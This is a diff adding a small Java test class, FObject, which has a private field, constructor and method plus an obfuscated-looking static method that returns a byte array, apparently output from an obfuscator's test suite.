@@ -1,0 +1,94 @@
+package pack.tests.reflects.field;
+
+public class FObject {
+    private int i;
+
+    private FObject(int var1) {
+        this.i = var1;
+    }
+
+    private void add() {
+        int var4 = this.i + 3;
+        this.i = var4;
+    }
+
+    private static byte[] gnmdizzzuakykcp() {
+        return new byte[]{
+            75,
+            69,
+            68,
+            109,
+            32,
+            34,
+            65,
+            13,
+            108,
+            25,
+            57,
+            69,
+            59,
+            81,
+            87,
+            122,
+            49,
+            17,
+            46,
+            45,
+            85,
+            91,
+            51,
+            45,
+            76,
+            97,
+            91,
+            81,
+            11,
+            52,
+            45,
+            91,
+            64,
+            4,
+            76,
+            112,
+            94,
+            12,
+            21,
+            44,
+            8,
+            4,
+            120,
+            57,
+            58,
+            102,
+            26,
+            64,
+            126,
+            126,
+            49,
+            60,
+            69,
+            18,
+            24,
+            34,
+            81,
+            58,
+            2,
+            105,
+            1,
+            95,
+            24,
+            106,
+            65,
+            21,
+            74,
+            83,
+            44,
+            59,
+            104,
+            82,
+            17,
+            39,
+            3
+        };
+    }
+}
